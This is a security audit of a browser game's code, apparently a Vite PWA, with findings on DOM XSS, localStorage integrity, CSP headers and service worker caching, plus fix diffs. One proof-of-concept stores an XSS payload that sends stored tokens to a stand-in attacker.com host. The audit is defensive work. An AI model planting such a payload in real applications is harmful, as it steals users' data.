# FLOPY.SPACE (ox-alpha) — Comprehensive Security, Storage & PWA Architecture Audit

**Target Repository**: `/Users/seintun/code/sandbox/ox-alpha`  
**Role**: Lead Application Security & Storage Architect  
**Audit Scope**: DOM security, Storage schema integrity & anti-cheat resilience, HTTP headers & CSP, Service Worker & PWA cache integrity, Supply chain & dependency review.  
**Target Document**: `docs/research/security-storage-pwa-audit.md`

---

## 1. Executive Summary & Threat Matrix

| Finding ID | Severity | Category | Description | Primary File(s) |
|---|---|---|---|---|
| **SEC-01** | **HIGH** | **Stored DOM XSS** | Direct interpolation of unescaped `localStorage` data into `innerHTML` (`m.title`, `m.description`, `readyMission.title`, `first.name`). | `src/ui/menu.ts`, `src/ui/gameover.ts` |
| **SEC-02** | **MEDIUM** | **DOM Injection** | `juice.popup(text)` assigns raw strings directly to `el.innerHTML = text`. | `src/systems/juice.ts` |
| **SEC-03** | **HIGH** | **Storage Crash / DoS** | Missing array type checks on `JSON.parse` outputs (`unlocked`, `unlockedChars`, `unlockedBiomes`, `missions`) causes uncaught `TypeError` (`.includes is not a function`, `.filter is not a function`), crashing bootstrap on corrupted data. | `src/core/storage.ts` |
| **SEC-04** | **MEDIUM** | **Storage Atomicity** | 17+ separate unversioned `localStorage` keys lead to non-atomic state updates and desynchronization if tab closes or quota is exceeded during transactions. | `src/core/storage.ts` |
| **SEC-05** | **MEDIUM** | **Anti-Cheat / Tampering** | Plaintext local state with no integrity verification + global `window.__FLOPY_GAME__` exposed unconditionally in production allows trivial score/token forgery. | `src/main.ts`, `src/core/storage.ts` |
| **SEC-06** | **HIGH** | **Missing CSP & Headers** | No `Content-Security-Policy`, `Permissions-Policy`, or `Strict-Transport-Security` headers defined in `vercel.json` or `index.html`. | `vercel.json`, `index.html` |
| **SEC-07** | **MEDIUM** | **SW Cache Poisoning / Stale Lock** | Stale-While-Revalidate cache-first pattern for `index.html` without version-busting or navigation network-first fallback risks indefinite stale app shell lock-in; unhandled non-HTTP schemes cause fetch errors. | `public/sw.js` |

---

## 2. Deep Dive Findings & Remediations

---

### SEC-01 & SEC-02: DOM XSS and Dynamic Template Injection

#### Vulnerability Analysis
In `src/ui/menu.ts` (lines 619–636) and `src/ui/gameover.ts` (lines 294, 361), mission titles, descriptions, and unlock names are interpolated directly into template literals and assigned to `element.innerHTML`.

While default hardcoded missions and character definitions are benign, `getStoredMissions()` reads from `localStorage.getItem("f3d.missions")`. If a malicious browser extension, XSS vector, or malicious bookmarklet alters `localStorage`, the stored payload is parsed and injected directly into the DOM tree as unescaped HTML.

In `src/systems/juice.ts` (line 273), the zero-GC popup pool executes `el.innerHTML = text;`. Any caller passing dynamic, user-provided, or external text triggers immediate script execution.

#### Proof of Concept Attack
```javascript
// Malicious payload stored in localStorage:
localStorage.setItem("f3d.missions", JSON.stringify([{
  id: "xss_exploit",
  category: "daily",
  title: `<img src=x onerror="fetch('https://attacker.com/steal?c='+localStorage.getItem('f3d.tokens'))">`,
  description: "Exploit payload",
  goal: 1,
  current: 1,
  rewardFeathers: 1,
  completed: true,
  claimed: false
}]));
// On next page refresh, opening Quests tab executes the payload immediately in user context.
```

#### Remediation Snippets

**A. Hardening `src/systems/juice.ts`:**
```diff
--- a/src/systems/juice.ts
+++ b/src/systems/juice.ts
@@ -270,7 +270,7 @@ export class JuiceSystem {
     if (item.timer2) clearTimeout(item.timer2);
 
     const el = item.el;
-    el.innerHTML = text;
+    el.textContent = text;
     el.style.color = color;
     el.style.textShadow = `0 2px 10px rgba(0,0,0,0.85), 0 0 16px ${color}88`;
```

**B. Hardening `src/ui/menu.ts` Mission Item Rendering:**
```diff
--- a/src/ui/menu.ts
+++ b/src/ui/menu.ts
@@ -616,13 +616,19 @@ export class MenuView {
       box-shadow: ${isReadyToClaim ? "0 0 12px rgba(255, 215, 0, 0.25)" : "none"};
       animation: ${isReadyToClaim ? "softGlowPulse 1.2s infinite alternate" : "none"};
     `;
 
     const progressPct = Math.min(100, Math.round((m.current / m.goal) * 100));
+    
+    // Sanitize or construct safely with textContent
+    const safeTitle = document.createElement("div");
+    safeTitle.style.cssText = "font-size: 11px; font-weight: 800; color: #fff;";
+    safeTitle.textContent = m.title;
+    
+    const safeDesc = document.createElement("div");
+    safeDesc.style.cssText = "font-size: 9px; color: #94a3b8;";
+    safeDesc.textContent = `${m.description} (${Math.min(m.current, m.goal)}/${m.goal})`;
 
     item.innerHTML = `
-      <div style="flex: 1;">
-        <div style="font-size: 11px; font-weight: 800; color: #fff;">${m.title}</div>
-        <div style="font-size: 9px; color: #94a3b8;">${m.description} (${Math.min(m.current, m.goal)}/${m.goal})</div>
+      <div class="mission-text-container" style="flex: 1;">
         <div style="width: 100%; height: 3px; background: rgba(0,0,0,0.5); border-radius: 2px; margin-top: 4px; overflow: hidden;">
           <div style="width: ${progressPct}%; height: 100%; background: ${m.completed ? "linear-gradient(90deg, #00ffc3, #00b4d8)" : "#00e5ff"};"></div>
         </div>
@@ -636,6 +642,10 @@ export class MenuView {
         }
       </div>
     `;
+    
+    const textContainer = item.querySelector(".mission-text-container");
+    if (textContainer) {
+      textContainer.prepend(safeDesc);
+      textContainer.prepend(safeTitle);
+    }
```

---

### SEC-03, SEC-04 & SEC-05: LocalStorage Schema Integrity, Type Safety & Anti-Cheat

#### Vulnerability Analysis
1. **Unhandled Type Coercion Crash (`TypeError`)**:
   In `src/core/storage.ts`:
   ```ts
   let unlocked = ["classic"];
   try {
     const rawUnlocked = getLocal("unlocked");
     if (rawUnlocked) unlocked = JSON.parse(rawUnlocked);
     if (!unlocked.includes("classic")) unlocked.unshift("classic");
   } catch {
     unlocked = ["classic"];
   }
   ```
   If `rawUnlocked` is `"true"`, `"42"`, or `"{}"`, `JSON.parse` does **not** throw. Variable `unlocked` is assigned a boolean/number/object. The subsequent call `unlocked.includes("classic")` immediately raises an unhandled `TypeError: unlocked.includes is not a function`, crashing game initialization.

2. **Negative & Non-Finite Numbers in Parser**:
   `parseInt("-50", 10) || 0` returns `-50`. Negative numbers are accepted for `best`, `totalRuns`, `totalPipesPassed`, and `totalPlayTimeSec`. `Infinity` or `NaN` passed to numeric routines can corrupt arithmetic.

3. **Storage Fragmentation & Lack of Versioned Atomic Schema**:
   State is fragmented across 17 distinct keys (`f3d.best`, `f3d.tokens`, `f3d.lifetimeTokens`, `f3d.unlockedChars`, `f3d.missions`, etc.). A failure during any multi-step action (e.g. deducting tokens and unlocking a character) leaves the local state corrupted and desynchronized.

4. **Production Global Object Exposure & Trivial Cheat Vector**:
   In `src/main.ts` line 34: `(window as any).__FLOPY_GAME__ = game;` exposes the full game instance globally in production builds without gating for development or automated testing environments.

#### Concrete Remediation Architecture: Unified Versioned Storage with Type Guards

**Robust Parser Helper & Schema Validation (`src/core/storage.ts`):**

```typescript
// Safe JSON Array Parser Helper with Type Predicate
function safeParseArray<T>(raw: string | null, fallback: T[], itemValidator?: (item: any) => boolean): T[] {
  if (!raw) return fallback;
  try {
    const parsed = JSON.parse(raw);
    if (!Array.isArray(parsed)) return fallback;
    if (itemValidator) {
      return parsed.filter(itemValidator);
    }
    return parsed as T[];
  } catch {
    return fallback;
  }
}

// Safe Non-Negative Integer Helper
function safeInt(raw: string | null, fallback = 0, max = Number.MAX_SAFE_INTEGER): number {
  if (!raw) return fallback;
  const num = parseInt(raw, 10);
  if (Number.isNaN(num) || !Number.isFinite(num) || num < 0) return fallback;
  return Math.min(num, max);
}

// Safe Float Helper
function safeFloat(raw: string | null, fallback = 0): number {
  if (!raw) return fallback;
  const num = parseFloat(raw);
  if (Number.isNaN(num) || !Number.isFinite(num) || num < 0) return fallback;
  return num;
}
```

**State Invariant Verification (`src/core/storage.ts`):**
```typescript
export function validateAndSanitizeSaveData(data: SaveData): SaveData {
  // Invariant 1: Available tokens cannot exceed lifetime tokens
  if (data.tokens > data.lifetimeTokens) {
    data.lifetimeTokens = data.tokens;
  }

  // Invariant 2: Feathers strictly clamped to bank cap [0, 3]
  data.feathers = Math.min(FEATHER_BANK_CAP, Math.max(0, data.feathers));

  // Invariant 3: Best score cannot be negative
  data.best = Math.max(0, data.best);

  // Invariant 4: Base items must always exist
  if (!data.unlocked.includes("classic")) data.unlocked.unshift("classic");
  if (!data.unlockedChars.includes("bird")) data.unlockedChars.unshift("bird");
  if (!data.unlockedBiomes.includes("meadow")) data.unlockedBiomes.unshift("meadow");

  return data;
}
```

**Production Global Gating (`src/main.ts`):**
```diff
--- a/src/main.ts
+++ b/src/main.ts
@@ -32,8 +32,8 @@ const rig = createCameraRig(() => window.innerWidth / window.innerHeight);
 const ctx = createScene(app, rig.camera);
 const game = new Game(ctx, rig, app);
-if (typeof window !== "undefined") {
+if (typeof window !== "undefined" && import.meta.env.DEV) {
   (window as any).__FLOPY_GAME__ = game;
 }
```

---

### SEC-06: Content Security Policy & HTTP Security Headers

#### Vulnerability Analysis
Currently, `vercel.json` sets basic headers (`X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`) but is missing:
- **`Content-Security-Policy` (CSP)**: Essential for mitigating XSS, restricting script/style/connect domains, and blocking untrusted origins.
- **`Permissions-Policy`**: Essential to disable unused device APIs (camera, microphone, geolocation, payment).
- **`Strict-Transport-Security` (HSTS)**: Essential for enforcing SSL/TLS.
- **`Cross-Origin-Opener-Policy` (COOP) & `Cross-Origin-Resource-Policy` (CORP)**: Mitigate cross-origin timing and resource leaks.

#### Hardened Configuration

**`vercel.json` Remediation:**
```json
{
  "framework": "vite",
  "buildCommand": "npm run build",
  "outputDirectory": "dist",
  "cleanUrls": true,
  "rewrites": [
    {
      "source": "/((?!assets/|icon.svg|manifest.webmanifest|sw.js|CNAME|.*\\..*).*)",
      "destination": "/index.html"
    }
  ],
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com data:; img-src 'self' data: blob:; connect-src 'self' https://vitals.vercel-insights.com https://fonts.googleapis.com https://fonts.gstatic.com; media-src 'self' data: blob:; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'self'; upgrade-insecure-requests;"
        },
        {
          "key": "Strict-Transport-Security",
          "value": "max-age=63072000; includeSubDomains; preload"
        },
        {
          "key": "X-Content-Type-Options",
          "value": "nosniff"
        },
        {
          "key": "X-Frame-Options",
          "value": "SAMEORIGIN"
        },
        {
          "key": "Referrer-Policy",
          "value": "strict-origin-when-cross-origin"
        },
        {
          "key": "Permissions-Policy",
          "value": "accelerometer=(), camera=(), geolocation=(), gyroscope=(), magnetometer=(), microphone=(), payment=(), usb=()"
        },
        {
          "key": "Cross-Origin-Opener-Policy",
          "value": "same-origin"
        },
        {
          "key": "Cross-Origin-Resource-Policy",
          "value": "same-origin"
        }
      ]
    },
    {
      "source": "/sw.js",
      "headers": [
        {
          "key": "Cache-Control",
          "value": "public, max-age=0, must-revalidate"
        },
        {
          "key": "Service-Worker-Allowed",
          "value": "/"
        }
      ]
    },
    {
      "source": "/manifest.webmanifest",
      "headers": [
        {
          "key": "Content-Type",
          "value": "application/manifest+json"
        },
        {
          "key": "Cache-Control",
          "value": "public, max-age=86400, stale-while-revalidate=604800"
        }
      ]
    },
    {
      "source": "/assets/(.*)",
      "headers": [
        {
          "key": "Cache-Control",
          "value": "public, max-age=31536000, immutable"
        }
      ]
    }
  ]
}
```

---

### SEC-07: Service Worker & PWA Cache Architecture Audit

#### Vulnerability Analysis in `public/sw.js`
1. **Unfiltered Request Schemes**: Non-HTTP/HTTPS requests (e.g. `chrome-extension://`, `blob:`, `data:`) trigger `fetch(event.request)` and generate console exceptions.
2. **App-Shell Cache Stale Lock**: `event.respondWith(caches.match(...).then(cached => cached || fetchPromise))` returns the cached `index.html` immediately. For single-page applications built with Vite, this causes users to execute stale JS chunks until an extra background update cycle completes.
3. **External Font Opaque Response Handling**: Requests to `fonts.googleapis.com` or `fonts.gstatic.com` can return opaque responses (status 0). If checked strictly with `response.status === 200`, opaque responses are discarded from cache, failing offline font rendering.

#### Hardened `public/sw.js` Remediation

```javascript
const CACHE_NAME = "flopy-space-v2";
const PRECACHE_ASSETS = [
  "./",
  "index.html",
  "manifest.webmanifest",
  "icon.svg",
];

// 1. Install & Precache core app shell
self.addEventListener("install", (event) => {
  event.waitUntil(
    caches
      .open(CACHE_NAME)
      .then((cache) => cache.addAll(PRECACHE_ASSETS))
      .then(() => self.skipWaiting())
  );
});

// 2. Activate & Purge stale caches
self.addEventListener("activate", (event) => {
  event.waitUntil(
    caches
      .keys()
      .then((keys) =>
        Promise.all(
          keys.filter((key) => key !== CACHE_NAME).map((key) => caches.delete(key))
        )
      )
      .then(() => self.clients.claim())
  );
});

// 3. Fetch Strategy:
// - Navigation (HTML): Network-First with Cache Fallback
// - Static /assets/ & Precached: Cache-First
// - Web Fonts: Stale-While-Revalidate with Opaque Support
self.addEventListener("fetch", (event) => {
  if (event.request.method !== "GET") return;

  const url = new URL(event.request.url);

  // Ignore non-http(s) schemes (e.g., chrome-extension://)
  if (!url.protocol.startsWith("http")) return;

  // Strategy A: Navigation requests (HTML) -> Network-First (ensures fresh deployments)
  if (event.request.mode === "navigate") {
    event.respondWith(
      fetch(event.request)
        .then((networkResponse) => {
          if (networkResponse && networkResponse.status === 200) {
            const copy = networkResponse.clone();
            caches.open(CACHE_NAME).then((cache) => cache.put(event.request, copy));
          }
          return networkResponse;
        })
        .catch(() => caches.match("./") || caches.match("index.html"))
    );
    return;
  }

  // Strategy B: External Fonts -> Stale-While-Revalidate with opaque support
  if (url.origin === "https://fonts.googleapis.com" || url.origin === "https://fonts.gstatic.com") {
    event.respondWith(
      caches.match(event.request).then((cached) => {
        const networkFetch = fetch(event.request).then((response) => {
          if (response && (response.status === 200 || response.type === "opaque")) {
            const copy = response.clone();
            caches.open(CACHE_NAME).then((cache) => cache.put(event.request, copy));
          }
          return response;
        }).catch(() => cached);

        return cached || networkFetch;
      })
    );
    return;
  }

  // Strategy C: Hashed Assets & Static App Shell -> Cache-First
  event.respondWith(
    caches.match(event.request).then((cached) => {
      if (cached) return cached;

      return fetch(event.request).then((networkResponse) => {
        if (networkResponse && networkResponse.status === 200) {
          const copy = networkResponse.clone();
          caches.open(CACHE_NAME).then((cache) => cache.put(event.request, copy));
        }
        return networkResponse;
      });
    })
  );
});
```
